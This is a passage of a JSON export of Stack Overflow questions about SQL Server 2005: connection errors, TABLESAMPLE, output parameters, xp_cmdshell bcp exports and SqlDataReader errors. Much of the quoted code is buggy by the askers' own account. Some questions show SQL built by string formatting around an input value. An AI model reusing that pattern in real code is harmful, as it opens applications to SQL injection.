myDbTest.displayDbProperties();\n     }\n}\n</code></pre>\n\n<p>But I am getting following exceptions:</p>\n\n<pre>\ncom.microsoft.sqlserver.jdbc.SQLServerException: The TCP/IP connection to the host  has failed. java.net.ConnectException: Connection refused: connect\n        at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDriverError(Unknown Source)\nError Trace in getConnection() : The TCP/IP connection to the host  has failed. java.net.ConnectException: Connection refused: connect\nError: No active Connection\n</pre>\n\n<p>I am not getting where is the problem in the above code or do i need to do some setting \nto connect to remote server.</p>\n\n<p>Please give me your valuable suggestion which can help me to overcome with this problem.</p>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":239,"score":5,"question_id":10725839,"title":"TABLESAMPLE returns wrong number of rows?","body":"<p>I've just discovered the <a href=\"http://msdn.microsoft.com/en-us/library/ms189108%28v=sql.90%29.aspx\" rel=\"nofollow\"><code>TABLESAMPLE</code></a> clause but surprisingly it doesn't return the number of rows i've specified.</p>\n\n<p>The table that i've used has ~14M rows and i wanted an arbitrary sample of 10000 rows.</p>\n\n<pre><code>select * from tabData TABLESAMPLE(10000 ROWS)\n</code></pre>\n\n<p>I get not 10000 but a different number everytime i execute it(between 8000 and 14000). </p>\n\n<p>What's going on here, have i misunderstood the intended purpose of <code>TABLESAMPLE</code>?</p>\n\n<p><strong>Edit</strong>: </p>\n\n<p><a href=\"http://www.mssqltips.com/sqlservertip/1308/retrieving-random-data-from-sql-server-with-tablesample/\" rel=\"nofollow\">David's link</a> explains it pretty well.</p>\n\n<p>This returns always 10000 roughly random rows in an efficient way:</p>\n\n<pre><code>select TOP 10000 * from tabData TABLESAMPLE(20000 ROWS);\n</code></pre>\n\n<p>and the <code>REPEATABLE</code> option helps to get always the same (unless data has changed)</p>\n\n<pre><code>select TOP 10000 * from tabData TABLESAMPLE(10000 ROWS) REPEATABLE(100);\n</code></pre>\n\n<p>Since i wanted to know if it's more expensive to use <code>TABLESAMPLE</code> with a large number of rows to ensure(?) that i get the correct row-number, i've measured it;</p>\n\n<p>1.loop (20 times):</p>\n\n<pre><code>select TOP 10000 * from tabData TABLESAMPLE(10000 ROWS);\n\n(9938 row(s) affected)\n(10000 row(s) affected)\n(9383 row(s) affected)\n(9526 row(s) affected)\n(10000 row(s) affected)\n(9545 row(s) affected)\n(9560 row(s) affected)\n(9673 row(s) affected)\n(9608 row(s) affected)\n(9476 row(s) affected)\n(9766 row(s) affected)\n(10000 row(s) affected)\n(9500 row(s) affected)\n(9941 row(s) affected)\n(9769 row(s) affected)\n(9547 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(9478 row(s) affected)\nFirst batch(only 10000 rows) completed in: 14 seconds!\n</code></pre>\n\n<p>2.loop (20 times):</p>\n\n<pre><code>select TOP 10000 * from tabData TABLESAMPLE(10000000 ROWS);\n\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\n(10000 row(s) affected)\nSecond batch(max rows) completed in: 13 seconds!\n</code></pre>\n\n<p>3.loop:  counterscheck with 100% random rows using ORDER BY NEWID():</p>\n\n<pre><code>select TOP 10000 * from tabData ORDER BY NEWID();\n\n(10000 row(s) affected)\n</code></pre>\n\n<p>Cancelled after one execution that lasted <strong>23 minutes</strong></p>\n\n<p><strong>Conclusion</strong>:</p>\n\n<p>So suprisingly the approach with a exact <code>TOP</code> clause and a large number in <code>TABESAMPLE</code> is <strong>not</strong> slower. Hence it's a very efficient alternative to <code>ORDER BY NEWID()</code> if it doesn't matter that the rows are not random per row but per page level(Each 8K page for the table is given a random value).</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":29,"score":1,"question_id":10726644,"title":"How to find the name for a full text catalog","body":"<p>I use SQL Server 2005, I have a database which uses full-text catalog.</p>\n\n<p>I need to delete the full-text catalog but I do not know its name so I would like to know how to find the name for it.</p>\n\n<p>Any idea thanks</p>\n"},{"tags":["c#","sql-server-2005","stored-procedures","sqldatareader","output-parameter"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":2766,"score":0,"question_id":1364721,"title":"Reading SP with output parameters and result set in C#?","body":"<p>I have created a stored procedure similar to this simplified example:</p>\n\n<pre><code>CREATE PROCEDURE dbo.sp_MyStoredProcedure\n    @Var1 INT OUTPUT,\n    @Var2 DECIMAL(10,2) OUTPUT\nAS\nBEGIN\n    SET NOCOUNT ON;\n\n    SELECT\n        @Var1 = COUNT(*),\n        @Var2 = SUM(TranAmount)\n    FROM\n        MyTable\n\n    SELECT * FROM MyTable\nEND\n</code></pre>\n\n<p>When I try to read the values from the output variables after I call the <code>ExecuteReader()</code> method of the <code>SqlCommand</code> object, the values are null.</p>\n\n<pre><code>string MyConnString = string.Empty;\nSqlConnection MyConn = new SqlConnection(MyConnString);\nSqlCommand MyCmd = new SqlCommand(\"sp_MyStoredProcedure\", MyConn);\nMyCmd.CommandType = CommandType.StoredProcedure;\nMyCmd.Parameters.Add(new SqlParameter(\"@Var1\", SqlDbType.Int));\nMyCmd.Parameters.Add(new SqlParameter(\"@Var2\", SqlDbType.Decimal);\nMyCmd.Parameters[0].Direction = ParameterDirection.Output;\nMyCmd.Parameters[1].Direction = ParameterDirection.Output;\nSqlDataReader dr = MyCmd.ExecuteReader(CommandBehavior.CloseConnection);\nint Var1 = Convert.ToInt32(MyCmd.Parameters[0].Value);\ndecimal Var1 = Convert.ToDecimal(MyCmd.Parameters[1].Value);\n</code></pre>\n\n<p>What I am doing wrong?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":10726078,"title":"Concatenated columns getting truncated (different behaviour depending on server)","body":"<p>Someone here has a T-SQL query that concatenates columns and the result gets truncated to about 20 characters when we access one server (SQL Server 2005) run in a query window in SQL Server Management Studio.</p>\n\n<p>The same exact query run against our test DB (SQL Server 2005 also) does not truncate the result. Running <code>SQLCMD.exe</code> does not truncate the result.</p>\n\n<p>I have changed the <code>Tools &gt; Options &gt; Query Results &gt; Results to Text</code> to 8192 but that had no effect, the query output is still truncated.</p>\n\n<p>Is there a default setting for the server or the DB itself that could override or provide a default column width? If so is there a way to set that in the select itself?</p>\n\n<p>Any help appreciated in understanding what might be going on. BTW that person said that query used to work.</p>\n\n<p>Thanks,</p>\n\n<p>John Putnam</p>\n"},{"tags":["c#","asp.net",".net","multithreading","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":149,"score":0,"question_id":10726061,"title":"Multi threading of process in C#","body":"<p>I have the following code that runs to start my table calculations (the table calculations fire off a few queries returning thousands of rows). When my app just runs one instance, things are fine, but 2 or more then the server slows done and I start to get errors.</p>\n\n<p>Should I turn this code into threads? How is that done?</p>\n\n<pre><code>private static object _lock = new object();\n\nprivate void RunTable(string outputType, string _outputDataType) {\n\n        Server.ScriptTimeout = 300;\n\n        string returnCode = string.Empty;\n        lock (_lock)\n        {\n            using (SqlConnection connection = new SqlConnection(ConfigurationManager.ConnectionStrings[\"MainDll\"].ToString()))\n            {\n                connection.Open();\n                using (SqlCommand command = new SqlCommand(sql.ToString(), connection))\n                {\n                    command.CommandType = CommandType.Text;\n                    command.CommandTimeout = 300;\n                    returnCode = (string)command.ExecuteScalar();\n                    Dispose();\n                }\n                Dispose();\n            }\n        }\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":10724350,"title":"SQL - ORDER BY running first","body":"<p>Please have a look at this database schema:</p>\n\n<pre><code>create table Person (id int not null identity,\n                     [index] varchar(30),\n                     datecreated datetime, \n                     groupid int)\n\ncreate table [Group] (id int identity not null, description varchar(30))\n</code></pre>\n\n<p>Sample data:</p>\n\n<pre><code>insert into Person ([index],datecreated,groupid) values ('4,5,6','2011-01-01',1)\ninsert into Person ([index],datecreated,groupid) values ('1,2,3','2011-02-02',1)\ninsert into Person ([index],datecreated,groupid) values ('7,8','2012-02-02',2) \n\ninsert into [Group] (description) values ('TestGroup')\ninsert into [Group] (description) values ('TestGroup2')\n</code></pre>\n\n<p>Please have a look at the SQL statement below:</p>\n\n<pre><code>select  *    \nfrom Person \ninner join [Group] on Person.groupid = [group].id \nwhere [group].description = 'TestGroup' \norder by \n   left(substring([index], charindex(',', [index]) + 1, 200),  \n        charindex(',', substring([index], charindex(',', [index]) + 1, 200)) - 1)\n</code></pre>\n\n<p>This SQL statement fails with the following error: </p>\n\n<blockquote>\n  <p>Invalid length parameter passed to the SUBSTRING function.</p>\n</blockquote>\n\n<p>It is the <code>order by</code> clause that is causing this error i.e. it is trying to find the third element of the index column but the third element does not exist on row 3 (there are only two elements).  </p>\n\n<p>However, I would expect the <code>[group].description = 'TestGroup'</code> to filter out record three. This does not appear to be the case. It is as if the <code>order by</code> clause is being run before the <code>where</code> clause. If you exclude the <code>order by</code> clause from the query, then the query runs.  </p>\n\n<p>Why is this? </p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":190,"score":0,"question_id":10720486,"title":"Date / Timestamp to record when a record was added to the table?","body":"<p>Does anyone know of a function as such that I can use to add an automatic date and timestamp in a column for when a user adds a record to the database table?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":10721994,"title":"insert 0 into successive row with same fields value","body":"<p>I have a table containing the following line:</p>\n\n<p><img src=\"http://i.stack.imgur.com/FTwGa.png\" alt=\"enter image description here\"></p>\n\n<p>I'd like to create a view that displays the following result (without changing my original table) :</p>\n\n<p><img src=\"http://i.stack.imgur.com/R7XmY.png\" alt=\"enter image description here\"></p>\n\n<p>For each line having the same id,day,month and year I'd like to leave a single line with the cost and count and insert 0 in the others.</p>\n"},{"tags":["sql-server-2005","tsql","batch-file","xp-cmdshell"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2837,"score":2,"question_id":5569051,"title":"Microsoft SQL xp_cmdshell doesn't like filenames with spaces. Can I replace the space with something else?","body":"<p>I have this TSQL code that dumps data from tables using BCP.  It looks complicated, but it simply creates a @command string to be executed once for each table, then BCP dump the table records to disk.  It's a nice way to backup all the table data quickly.  Below I show the resolved version which is a little easier to read.</p>\n\n<pre><code>set @command = \n  'if (''?'' &lt;&gt; ''[dbo].[sysdiagrams]'') \n   BEGIN;\n       create table #result (result nvarchar(2048) null );\n       declare @temp nvarchar(1000); \n       set @temp = ''' +  @bcpPath + ' ' + @database + '.dbo.'' + \n           substring( ''?'', 8, len(''?'')- 8) +\n           '' out \"' + @driveLetter + @drivePath +\n           '\\'' + substring( ''?'', 8, len(''?'')- 8) + \n           ''.out\" -c -x -t\"|\" -Uuser -Ppassword'';\n       insert into #result (result)\n       exec xp_cmdshell @temp;\n       drop table #result;\n   END;'\n   exec sp_msforeachtable @command\n</code></pre>\n\n<p>the <code>@bcppath</code> is <code>C:\\Program Files\\Microsoft SQL Server\\90\\Tools\\Binn\\bcp.exe</code> which has a space.</p>\n\n<p>Without using double quotes around the path <code>\"\"</code>, it gives an error of <code>'C:\\Program' is not recognized...</code>  With using double quotes, it gives the same error.  With using double double quotes <code>\"\" \"\"</code>, it says <code>The filename, directory name, or volume label syntax is incorrect.</code></p>\n\n<p>@command resolves to this when printed:</p>\n\n<pre><code>if ('?' &lt;&gt; '[dbo].[sysdiagrams]') \nBEGIN;\n    create table #result (result nvarchar(2048) null );\n    declare @temp nvarchar(1000); \n    set @temp = '\"C:\\Program Files\\Microsoft SQL Server\\90\\Tools\\Binn\\bcp.exe\" \n        myDB.dbo.' + \n        substring( '?', 8, len('?')- 8) +\n        ' out \"E:\\DataExports\\' + \n        substring( '?', 8, len('?')- 8) + '.out\" -c -x -t\"|\" -Uuser -Ppassword';\n    insert into #result (result)\n    exec xp_cmdshell @temp;\n    drop table #result;\nEND;\n</code></pre>\n\n<p>EDIT:</p>\n\n<p>Oddly, I put an <code>ECHO ? &amp;&amp;</code> in front of the \"path\" and it worked (surrounded by double quotes.)  .... Why? </p>\n"},{"tags":["c#","asp.net","sql-server-2005","pdf"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":202,"score":1,"question_id":10688403,"title":"Writing to a PDF with fields from SQL Server 2005","body":"<p>I'm running an asp.net 4 / c# site using SQL Server 2005 and want to write column values from within SQL Server into a PDF file which already has content inside it (I want to personalise a PDF voucher that you get from the logged in page on my site) </p>\n\n<p>Is there an easy tutorial to look at or is this a much bigger job?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":97,"score":1,"question_id":10705150,"title":"QuoteName not giving result","body":"<p>I am trying this code </p>\n\n<pre><code>CREATE TABLE #t \n( \n   nam Varchar(100) \n) \nINSERT INTO #t(nam)VALUES('abc[]def') \nSELECT * FROM #t Where Quotename(nam) like Quotename('abc[]def') \ndrop table #t \n</code></pre>\n\n<p>and not giving me any result.... Am I missing something?</p>\n"},{"tags":["sql","sql-server-2005","ssms"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":10705112,"title":"Search of SQL Database","body":"<p>I was wondering if it is possible to search for a string of data in an entire sql database?</p>\n\n<p>i know you can search for certain column headers etc but I need to search for a single string of data and have no idea where in the database (table / column etc ) it will be held.</p>\n\n<p>Is it possible?  How would I do this in order to return the column, table or both for where it is held?</p>\n\n<p>any advice much appreciated.</p>\n\n<p>(I am using sql server management studio 2005)</p>\n"},{"tags":["sql-server-2005","datetime","type-conversion"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":274,"score":1,"question_id":10719344,"title":"Convert string to datetime in where statement in SQL Server","body":"<p>I have a problem with string to <code>datetime</code> conversion in SQL Server 2005.</p>\n\n<p>If use <code>Convert(datetime, x)</code> in a where statement like this:</p>\n\n<pre><code>SELECT ThumbId\nFROM [ImageBankSQL].[dbo].[MetaData]\nWHERE (DataKey = 'ImagePropertyTagExifDTOrig'\n       OR DataKey='ImagePropertyTagDateTime')\nAND CONVERT(datetime, DataValue, 120) &gt; CONVERT(datetime, '2011-09-23 00:00:00', 120)\n</code></pre>\n\n<p>I get: </p>\n\n<blockquote>\n  <p>Conversion failed when converting datetime from character string</p>\n</blockquote>\n\n<p>But if I select the converted <code>datetime</code> instead of using them in the where statement, everything is fine, and I get my converted dates:</p>\n\n<pre><code>SELECT ThumbId, Convert(datetime, DataValue, 120), Convert(datetime, '2011-09-23 00:00:00', 120)\nFROM [ImageBankSQL].[dbo].[MetaData]\nWHERE (DataKey = 'ImagePropertyTagExifDTOrig'\n       OR DataKey = 'ImagePropertyTagDateTime')\n</code></pre>\n\n<p>In both examples I have used both <code>Convert(datetime, DataValue, 120)</code> and <code>Convert(datetime, DataValue)</code> with the same results.</p>\n\n<p>Why can I convert in select, but not in where? And how would I make my first query with convert in the where statement work?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":114,"score":0,"question_id":10718505,"title":"SQL Statement (Insert /Join / Union All???)","body":"<p>Morning All,</p>\n\n<p>I have two web forms (WeeklyAgenda &amp; MonthlyAgenda) that holds minutes of meetings that are both seperate tables in my database. These web pages also enables users to add actions to an action table within my database.</p>\n\n<p>The minutes of meeting and actions both have a seperate button assigned to them when updating data. The Actions area enables a user to add three fields only (Action, Owner and Targetdate).  </p>\n\n<p>My Actions table has additional columns (AgendaID, AgendaDate, AgendaTypeDescription and ActionStatusID) that i would like to populate. These Additional columns are already available on the web page as they are part of the agenda form which the user has already filled out.  </p>\n\n<p>Instead of adding these fields again to my action area and getting the user to add these again, i want to save myself and Joe Bloggs time by trying to take these fields (AgendaID, AgendaDate, AgendaTypeDescription and ActionStatusID) that have already been added two one of the agenda tables and to extract them and import them somehow with the remaining fields (Action, Owner and Targetdate) and add these to the action table.</p>\n\n<p>Essentially the data is already there but spread accross three tables.</p>\n\n<p>I have been trying to make a join between these tables in a stored procedure to that thies extra fileds are inserted to the Actions table.</p>\n\n<p>Im not too sure how to complete this and have tried Joins and UNION all but not managed to get this working?</p>\n\n<p>I know that i need to join AgendaID, AgendaDate and AgendaTypeDescription from both the WeeklyAgenda table and the MonthlyAgenda table.</p>\n\n<p>This is my code so far for the action table stored procedure (That works without the additional fields)...</p>\n\n<pre><code> ALTER PROCEDURE [dbo].[Add_Action_Insert]\n     @ActionID INT OUTPUT,\n@Action VARCHAR(MAX),\n     @Owner VARCHAR(50),\n     @TargetDate DATETIME\n AS\n INSERT INTO Action (\n                    Action,\n          Owner,\n               TargetDate)                  \n    VALUES (\n        @Action,\n        @Owner,\n        @TargetDate)\n    SELECT @ActionID = scope_identity()\n</code></pre>\n\n<p>This is what i want to change it to... </p>\n\n<pre><code>   Alter PROCEDURE [dbo].[Add_Action_Insert_Test]\n     @ActionID INT OUTPUT,\n@AgendaID INT,\n@AgendaDate DATETIME,\n@AgendaTypeDescription VARCHAR(50),\n@Action VARCHAR(MAX),\n     @Owner VARCHAR(50),\n     @TargetDate DATETIME,\n@ActionStatusID INT\n  AS\n  INSERT INTO Action (\n        AgendaID,\n        AgendaDate,\n        AgendaTypeDescription,\n        Action,\n        Owner,\n        TargetDate,\n        ActionStatusID)                 \n    VALUES (\n        @AgendaID,\n        @AgendaDate,\n        @AgendaTypeDescription,\n        @Action,\n        @Owner,\n        @TargetDate,\n        @ActionStatusID)\n    SELECT @ActionID = scope_identity()\n</code></pre>\n\n<p>This is an image of what data i have in the database now...\n<img src=\"http://i.stack.imgur.com/Hgvic.png\" alt=\"What i currently have\"></p>\n\n<p>This is an image of what i would like in my database...\n<img src=\"http://i.stack.imgur.com/x7cZ0.png\" alt=\"What i would like to achieve\"></p>\n\n<p>I appriechiate any information and help that i get.  Im just unsure if i need to Insert this additional information from the other two tanles or to make a join???</p>\n\n<p>Many Thanks in advance.\nBetty</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":10714171,"title":"Conflict in Case Condition in Sql Server query","body":"<pre><code>select  CASE when  (select distinct BR.BorrowerID from tblBorrow BR \ninner join tblWorker W on W.ContractorID=BR.BorrowerID \ninner join  tblBorrowWorker TWB on  TWB.WorkerID=W.WorkerID \ninner join tblBorrowWorkerAssign TBWA on TWB.BorrowWorkerAssignmentID=TBWA.BorrowWorkerAssignmentID where TWB.WorkerID=11276) then 'BR.BorrowerID'   else 'NotBorrowed' end as BorrowedStatus\n</code></pre>\n\n<p>Here actually in 'Then' Condition i want to display the BorrowerID,here the subquery part is working well and returning ID ,but when i add with CASE statment its giving an Error\n\"An expression of non-boolean type specified in a context where a condition is expected, near 'then'.\"This query is a part of my stored Procedure.What will be the solution</p>\n"},{"tags":["c#","asp.net",".net","sql-server-2005","sqldatareader"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":10712937,"title":"SqlDataReader and concurrency/deallocation issues","body":"<p>Running the below code is giving me an error:</p>\n\n<p>.NET Framework execution was aborted by escalation policy because of out of memory. \nSystem.InvalidOperationException: There is already an open DataReader associated with this Command which must be closed first.</p>\n\n<p>I have the following code all over the place to run my sql:</p>\n\n<pre><code>sql.Append(string.Format(\"SELECT TableId FROM ps_SavedTables WHERE guid = '{0}'\", guid));\n\n    using (IDataReader reader = SqlHelper.GetDataReader(sql.ToString())) {\n        if (reader.Read()) {\n            result = reader.IsDBNull(0) ? string.Empty : reader[0].ToString();\n        }\n        //CDW added to close SqlDataReader\n        reader.Close();\n    }\n</code></pre>\n\n<p>The GetDataReader is defined by this:</p>\n\n<pre><code>public static SqlDataReader GetDataReader(string sql, string connectionString) {\n    lock (_lock) {\n        SqlConnection connection = null;\n        try {\n            connection = GetConnection(connectionString);\n            //connection.Open();\n            using (SqlCommand cmd = new SqlCommand(sql, connection)) {\n                WriteDebugInfo(\"GetDataReader\", sql);\n                return cmd.ExecuteReader(CommandBehavior.CloseConnection);\n            }\n        }\n        catch (Exception e) {\n            if (connection != null)\n                connection.Dispose();\n            throw new DataException(sql, connectionString, e);\n        }\n\n    }\n}\n</code></pre>\n"},{"tags":["c#","asp.net",".net","sql-server-2005","sqldatareader"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":327,"score":-2,"question_id":10712860,"title":"Deallocation of SqlDataReader","body":"<p>I have a contractor that wrote code like this all over the place when we execute sql queries:</p>\n\n<pre><code>sql.Append(string.Format(\"SELECT TableId FROM ps_SavedTables WHERE guid = '{0}'\", guid));\n\n        using (IDataReader reader = SqlHelper.GetDataReader(sql.ToString())) {\n            if (reader.Read()) {\n                result = reader.IsDBNull(0) ? string.Empty : reader[0].ToString();\n            }\n            //CDW added to close SqlDataReader\n            reader.Close();\n        }\n</code></pre>\n\n<p>The GetDataReader class was in an App_Code helper file and is declared like so:</p>\n\n<pre><code> public static SqlDataReader GetDataReader(string sql) {\n        return GetDataReader(sql, DefaultConnectionString);\n    }\n\n    public static SqlDataReader GetDataReader(string sql, int connectionTime) {\n        return GetDataReader(sql, DefaultConnectionString, connectionTime);\n    }\n\n    /// &lt;summary&gt;\n    /// Executes DB command ExecutedReader and returns the DataReader\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"sql\"&gt;SQL statement(s) to be used with DB command&lt;/param&gt;\n    /// &lt;param name=\"connectionString\"&gt;Database connection string&lt;/param&gt;\n    /// &lt;returns&gt;DataReader containing results of supplied SQL statement(s)&lt;/returns&gt;\n    public static SqlDataReader GetDataReader(string sql, string connectionString) {\n        lock (_lock) {\n            SqlConnection connection = null;\n            try {\n                connection = GetConnection(connectionString);\n                //connection.Open();\n                using (SqlCommand cmd = new SqlCommand(sql, connection)) {\n                    WriteDebugInfo(\"GetDataReader\", sql);\n                    return cmd.ExecuteReader(CommandBehavior.CloseConnection);\n                }\n            }\n            catch (Exception e) {\n                if (connection != null)\n                    connection.Dispose();\n                throw new DataException(sql, connectionString, e);\n            }\n\n        }\n    }\n</code></pre>\n\n<p>Then I run my code locally (it does a ton of SQL for statistics) and run the same type of thing in two different browsers, 1 browser always crashes here:</p>\n\n<pre><code>Server.ScriptTimeout = 300;\n        string returnCode = string.Empty;\n        using (SqlConnection connection = new SqlConnection(ConfigurationManager.ConnectionStrings[\"MainDll\"].ToString())) {\n            connection.Open();\n            using (SqlCommand command = new SqlCommand(sql.ToString(), connection)) {\n                command.CommandType = CommandType.Text;\n                command.CommandTimeout = 300;\n                returnCode = (string)command.ExecuteScalar();\n                Dispose();\n            }\n            Dispose();\n        }\n</code></pre>\n\n<p>The stack tace is this:</p>\n\n<pre><code>.NET Framework execution was aborted by escalation policy because of out of memory. \nSystem.InvalidOperationException: There is already an open DataReader associated with this Command which must be closed first.\nSystem.InvalidOperationException: \n  at System.Data.SqlClient.SqlInternalConnectionSmi.ValidateConnectionForExecute(SqlCommand command)\n  at System.Data.SqlClient.SqlConnection.ValidateConnectionForExecute(String method, SqlCommand command)\n  at System.Data.SqlClient.SqlCommand.ValidateCommand(String method, Boolean async)\n  at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result)\n  at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method)\n  at System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method)\n  at System.Data.SqlClient.SqlCommand.ExecuteReader()\n  at PowerStatRegression.share.JbLog.SendResultSet(String str, SqlConnection conn)\n  at StoredProcedures.SavePowerStatErrors(ApplicationContext app, SqlString strUID, Int32 seqId, List`1 errors, Int32 errorType)\n  at StoredProcedures.CreatePowerStatCorr(SqlString strUID, Int32 seqId, Int32 flagProgress)\n  at StoredProcedures.SpCreatePowerStatCorr(SqlString strUID, Int32 seqId, Int32 flagProgress)\n\nDescription: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. \n\nException Details: System.Data.SqlClient.SqlException: .NET Framework execution was aborted by escalation policy because of out of memory. \nSystem.InvalidOperationException: There is already an open DataReader associated with this Command which must be closed first.\nSystem.InvalidOperationException: \n  at System.Data.SqlClient.SqlInternalConnectionSmi.ValidateConnectionForExecute(SqlCommand command)\n  at System.Data.SqlClient.SqlConnection.ValidateConnectionForExecute(String method, SqlCommand command)\n  at System.Data.SqlClient.SqlCommand.ValidateCommand(String method, Boolean async)\n  at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result)\n  at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method)\n  at System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method)\n  at System.Data.SqlClient.SqlCommand.ExecuteReader()\n  at PowerStatRegression.share.JbLog.SendResultSet(String str, SqlConnection conn)\n  at StoredProcedures.SavePowerStatErrors(ApplicationContext app, SqlString strUID, Int32 seqId, List`1 errors, Int32 errorType)\n  at StoredProcedures.CreatePowerStatCorr(SqlString strUID, Int32 seqId, Int32 flagProgress)\n  at StoredProcedures.SpCreatePowerStatCorr(SqlString strUID, Int32 seqId, Int32 flagProgress)\n\n\nSource Error: \n\n\nLine 705:                    command.CommandType = CommandType.Text;\nLine 706:                    command.CommandTimeout = 300;\nLine 707:                    returnCode = (string)command.ExecuteScalar();\nLine 708:                    //Dispose();\nLine 709:                }\n\n\nSource File: c:\\PowerStats\\datalab\\powerstats\\output.aspx.cs    Line: 707 \n\nStack Trace: \n\n    [SqlException (0x80131904): .NET Framework execution was aborted by escalation policy because of out of memory. \nSystem.InvalidOperationException: There is already an open DataReader associated with this Command which must be closed first.\nSystem.InvalidOperationException: \n   at System.Data.SqlClient.SqlInternalConnectionSmi.ValidateConnectionForExecute(SqlCommand command)\n   at System.Data.SqlClient.SqlConnection.ValidateConnectionForExecute(String method, SqlCommand command)\n   at System.Data.SqlClient.SqlCommand.ValidateCommand(String method, Boolean async)\n   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result)\n   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method)\n   at System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method)\n   at System.Data.SqlClient.SqlCommand.ExecuteReader()\n   at PowerStatRegression.share.JbLog.SendResultSet(String str, SqlConnection conn)\n   at StoredProcedures.SavePowerStatErrors(ApplicationContext app, SqlString strUID, Int32 seqId, List`1 errors, Int32 errorType)\n   at StoredProcedures.CreatePowerStatCorr(SqlString strUID, Int32 seqId, Int32 flagProgress)\n   at StoredProcedures.SpCreatePowerStatCorr(SqlString strUID, Int32 seqId, Int32 flagProgress)\n]\n   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +1950522\n   System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection) +4856715\n   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj) +194\n   System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1121\n   System.Data.SqlClient.SqlDataReader.ConsumeMetaData() +33\n   System.Data.SqlClient.SqlDataReader.get_MetaData() +83\n   System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString) +293\n   System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async) +954\n   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result) +162\n   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method) +32\n   System.Data.SqlClient.SqlCommand.ExecuteScalar() +139\n   Output.RunTable(String outputType, String _outputDataType) in c:\\PowerStats\\datalab\\powerstats\\output.aspx.cs:707\n   Output.ProcessPage() in c:\\PowerStats\\datalab\\powerstats\\output.aspx.cs:652\n   Output.Page_Load(Object sender, EventArgs e) in c:\\PowerStats\\datalab\\powerstats\\output.aspx.cs:644\n   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +14\n   System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) +35\n   